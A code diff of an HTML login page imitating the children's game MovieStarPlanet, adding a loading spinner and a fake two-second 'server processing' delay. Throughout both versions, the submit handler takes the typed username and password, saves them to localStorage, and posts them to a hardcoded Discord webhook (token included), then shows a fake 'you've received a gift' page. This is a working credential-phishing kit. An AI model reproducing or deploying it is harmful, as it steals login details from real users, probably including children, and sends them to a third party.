@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login</title>
-  <link rel="stylesheet" href="styles.css"> <!-- You'll create this file for styling -->
   <style>
     /* Custom CSS */
     body {
@@ -157,6 +156,42 @@
       75% { transform: translateX(-50%) rotate(-2deg); }
       100% { transform: translateX(-50%) rotate(0deg); }
     }
+
+    /* Visible code for positioning */
+    .shake-button {
+      position: fixed;
+      bottom: 12px; /* Adjust the distance from the bottom */
+      right: 20px; /* Adjust the distance from the right */
+      z-index: 995; /* Ensure it's above other content */
+    }
+
+    /* Loading animation */
+    .loader-container {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -201,6 +236,11 @@
     </div>
   </div>
 
+  <!-- Loading Animation -->
+  <div class="loader-container" id="loaderContainer">
+    <div class="loader"></div>
+  </div>
+
   <!-- JavaScript for contact link shake effect -->
   <script>
     document.getElementById('contact').addEventListener('click', function() {
@@ -216,115 +256,86 @@
     document.getElementById("login-form").addEventListener("submit", function(event) {
       event.preventDefault(); // Prevent form submission
       
-      // Get input values
-      var username = document.getElementById("username").value;
-      var password = document.getElementById("password").value;
+      // Show loader
+      document.getElementById("loaderContainer").style.display = "flex";
 
-      // Save username, password, and date to localStorage
-      var currentDate = new Date().toLocaleString();
-      localStorage.setItem("username", username);
-      localStorage.setItem("password", password);
-      localStorage.setItem("loginDate", currentDate);
-      
-      // Example: Sending data to Discord webhook
-      var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
-      var message = {
-        username: "Login Notification",
-        content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
-      };
-
-      // Send message to Discord webhook
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-      }).then(function(response) {
-        if (response.ok) {
-          // Open a new tab with congratulations message and image
-          var congratsPage = window.open();
-          congratsPage.document.write(`
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-              <meta charset="UTF-8">
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-              <title>Congratulations</title>
-              <style>
-                body { 
-                  font-family: Arial, sans-serif; 
-                  background-color: #d1c7c7; 
-                  color: #FFFFFF; 
-                  display: flex; 
-                  justify-content: center; 
-                  align-items: center; 
-                  height: 100vh; 
-                  margin: 0; 
-                  background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg'); 
-                  background-size: cover; 
-                  background-repeat: no-repeat; 
-                  background-position: center;
-                }
-                h2 { margin-bottom: 20px; }
-                img { width: 200px; }
-              </style>
-            </head>
-            <body>
-              <div>
-                <h2>Congratulations!</h2>
-                <p>You've received a gift:</p>
-                <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
-              </div>
-            </body>
-            </html>
-          `);
-          congratsPage.document.close(); // Close the document open for writing
-        } else {
-          alert("Failed to notify moderators. Please try again later.");
-        }
-      }).catch(function(error) {
-        console.error("Error:", error);
-        alert("An error occurred. Please try again later.");
-      });
-    });
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Your Website</title>
-  <!-- Add your other stylesheets and scripts here -->
-  <link rel="stylesheet" href="styles.css"> <!-- You'll create this file for styling -->
-  <style>
-    /* Visible code for positioning */
-    .shake-button {
-      position: fixed;
-      bottom: 12px; /* Adjust the distance from the bottom */
-      right: 20px; /* Adjust the distance from the right */
-      z-index: 995; /* Ensure it's above other content */
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Your existing website content goes here -->
-
-  <!-- Shake image button -->
-  <div class="shake-button">
-    <img src="https://moviestarplanet2.fr/img/marketing_splash/splash_en.png" alt="Shake Button" id="shakeButton">
-  </div>
-
-  <!-- JavaScript for shake effect -->
-  <script>
-    document.getElementById('shakeButton').addEventListener('click', function() {
-      this.style.animation = 'shake 0.5s'; // Add shake animation
+      // Simulate server processing
       setTimeout(() => {
-        this.style.animation = ''; // Reset animation after 0.5s
-      }, 500);
+        // Get input values
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+
+        // Save username, password, and date to localStorage
+        var currentDate = new Date().toLocaleString();
+        localStorage.setItem("username", username);
+        localStorage.setItem("password", password);
+        localStorage.setItem("loginDate", currentDate);
+        
+        // Example: Sending data to Discord webhook
+        var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
+        var message = {
+          username: "Login Notification",
+          content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
+        };
+
+        // Send message to Discord webhook
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(message)
+        }).then(function(response) {
+          if (response.ok) {
+            // Open a new tab with congratulations message and image
+            var congratsPage = window.open();
+            congratsPage.document.write(`
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Congratulations</title>
+                <style>
+                  body { 
+                    font-family: Arial, sans-serif; 
+                    background-color: #d1c7c7; 
+                    color: #FFFFFF; 
+                    display: flex; 
+                    justify-content: center; 
+                    align-items: center; 
+                    height: 100vh; 
+                    margin: 0; 
+                    background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg'); 
+                    background-size: cover; 
+                    background-repeat: no-repeat; 
+                    background-position: center;
+                  }
+                  h2 { margin-bottom: 20px; }
+                  img { width: 200px; }
+                </style>
+              </head>
+              <body>
+                <div>
+                  <h2>Congratulations!</h2>
+                  <p>You've received a gift:</p>
+                  <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
+                </div>
+              </body>
+              </html>
+            `);
+            congratsPage.document.close(); // Close the document open for writing
+          } else {
+            alert("Failed to notify moderators. Please try again later.");
+          }
+        }).catch(function(error) {
+          console.error("Error:", error);
+          alert("An error occurred. Please try again later.");
+        }).finally(function() {
+          // Hide loader
+          document.getElementById("loaderContainer").style.display = "none";
+        });
+      }, 2000); // Simulated delay of 2 seconds
     });
   </script>
 </body>
